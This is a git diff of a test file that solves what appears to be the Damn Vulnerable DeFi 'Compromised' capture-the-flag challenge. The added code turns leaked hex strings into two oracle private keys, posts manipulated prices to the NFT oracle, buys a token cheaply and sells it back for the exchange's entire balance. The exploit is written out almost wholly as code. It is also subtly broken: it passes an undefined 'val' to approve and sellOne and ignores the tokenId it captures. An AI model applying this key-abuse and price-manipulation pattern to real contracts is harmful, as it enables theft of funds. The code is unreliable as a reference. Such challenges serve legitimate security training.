@@ -1,4 +1,5 @@
 const { expect } = require('chai');
+const { BigNumber } = require('ethers');
 const { ethers } = require('hardhat');
 
 describe('Compromised challenge', function () {
@@ -59,8 +60,51 @@ describe('Compromised challenge', function () {
         this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
     });
 
-    it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+    it('Exploit', async function () {
+
+        // hex -> string -> base64 => private key -> address
+
+        // 4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535
+        // MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
+        // 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+        // 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
+
+        // 4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134
+        // MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
+        // 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+        // 0x81A5D6E50C214044bE44cA0CB057fe119097850c
+
+        const nftSymbol = "DVNFT";
+        const oneWei = ethers.utils.parseEther("0.000000000000000001");
+        const sellPrice = EXCHANGE_INITIAL_ETH_BALANCE.add(oneWei);
+
+        const signers = [
+            new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider),
+            new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider)
+        ];
+
+        // set the lowest possible median price
+        for (let i = 0; i < signers.length; i++) {
+            await this.oracle.connect(signers[i]).postPrice(nftSymbol, oneWei);
+        } 
+
+        // buy the nft token at the low price
+        const buyTx = await this.exchange.connect(attacker).buyOne({value: oneWei});
+        const tokenId = (await buyTx.wait()).events.find(e => e.event == 'TokenBought').args['tokenId'];
+
+        // set the highest possible median price
+        for (let i = 0; i < signers.length; i++) {
+            await this.oracle.connect(signers[i]).postPrice(nftSymbol, sellPrice);
+        }
+
+        // sell the token back
+        await this.nftToken.connect(attacker).approve(this.exchange.address, val);
+        await this.exchange.connect(attacker).sellOne(val);
+
+        // restore the initial price
+        for (let i = 0; i < signers.length; i++) {
+            await this.oracle.connect(signers[i]).postPrice(nftSymbol, INITIAL_NFT_PRICE);
+        }
     });
 
     after(async function () {
